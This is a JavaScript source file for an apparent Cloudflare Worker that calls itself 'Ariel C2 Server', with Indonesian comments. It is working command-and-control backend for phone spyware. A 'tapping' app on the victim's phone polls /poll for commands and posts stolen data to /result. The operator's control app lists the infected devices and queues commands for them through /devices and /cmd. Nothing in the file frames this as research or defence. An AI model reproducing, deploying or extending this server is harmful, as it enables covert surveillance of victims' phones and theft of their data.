export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const path = url.pathname;
    
    // CORS Headers
    const corsHeaders = {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
      "Access-Control-Allow-Headers": "Content-Type",
    };

    if (request.method === "OPTIONS") {
      return new Response(null, { headers: corsHeaders });
    }

    // ==========================================
    // ENDPOINT APK SADAP (HP KORBAN)
    // ==========================================
    if (path === "/poll" && request.method === "GET") {
      const id = url.searchParams.get("id");
      const model = url.searchParams.get("model") || "Unknown";
      const battery = url.searchParams.get("battery") || "0";

      if (id) {
        // Simpan ke KV (butuh binding) atau memory (hilang tiap restart)
        // Di sini kita simpan ke global memory sementara
        if (!globalThis.devices) globalThis.devices = {};
        if (!globalThis.commands) globalThis.commands = {};

        globalThis.devices[id] = { model, battery, last_seen: Date.now() };

        if (globalThis.commands[id] && globalThis.commands[id].length > 0) {
          const cmd = globalThis.commands[id].shift();
          return new Response(JSON.stringify({ cmd: cmd }), { 
            headers: { ...corsHeaders, "Content-Type": "application/json" } 
          });
        }
      }
      return new Response("null", { headers: corsHeaders });
    }

    if (path === "/result" && request.method === "POST") {
      const body = await request.json();
      console.log("\n[+] DATA DARI TARGET:", JSON.stringify(body));
      return new Response("ok", { headers: corsHeaders });
    }

    // ==========================================
    // ENDPOINT APK KONTROL (HP KAMU)
    // ==========================================
    if (path === "/devices" && request.method === "GET") {
      if (!globalThis.devices) globalThis.devices = {};
      const now = Date.now();
      const active = [];

      for (let id in globalThis.devices) {
        if (now - globalThis.devices[id].last_seen < 15000) {
          active.push({ 
            id: id, 
            model: globalThis.devices[id].model, 
            battery: globalThis.devices[id].battery 
          });
        } else {
          delete globalThis.devices[id];
        }
      }

      return new Response(JSON.stringify(active), { 
        headers: { ...corsHeaders, "Content-Type": "application/json" } 
      });
    }

    if (path === "/cmd" && request.method === "POST") {
      const body = await request.json();
      if (body.id && body.cmd) {
        if (!globalThis.commands) globalThis.commands = {};
        if (!globalThis.commands[body.id]) globalThis.commands[body.id] = [];
        globalThis.commands[body.id].push(body.cmd);
      }
      return new Response("ok", { headers: corsHeaders });
    }

    return new Response("Ariel C2 Server Aktif", { headers: corsHeaders });
  }
};
